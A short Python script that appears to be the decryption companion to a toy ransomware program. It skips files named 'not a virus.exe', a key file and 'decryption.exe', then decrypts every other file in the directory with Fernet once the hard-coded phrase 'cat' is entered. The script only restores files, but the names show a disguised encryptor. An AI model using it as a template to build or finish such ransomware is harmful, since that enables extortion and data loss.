import os
from cryptography.fernet import Fernet

files = [] #empty list for all of the found files




for file in os.listdir():
    if file == "not a virus.exe" or file =="82926249564354929" or file =="decryption.exe":
        continue
    if os.path.isfile(file): #adds all the files found to our list
        files.append(file)
secretphrase = "cat"

user_prase = input("Enter the secret phrase to decrypt your files:   ")
if user_prase == secretphrase:
    print(files)
    with open("82926249564354929", "rb") as key:
        secretkey = key.read()

    for file in files:
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        except:
            print(file)
            print("cannot be decrypted")

    print("files have been decrypted")

else:
    print("WRONG")


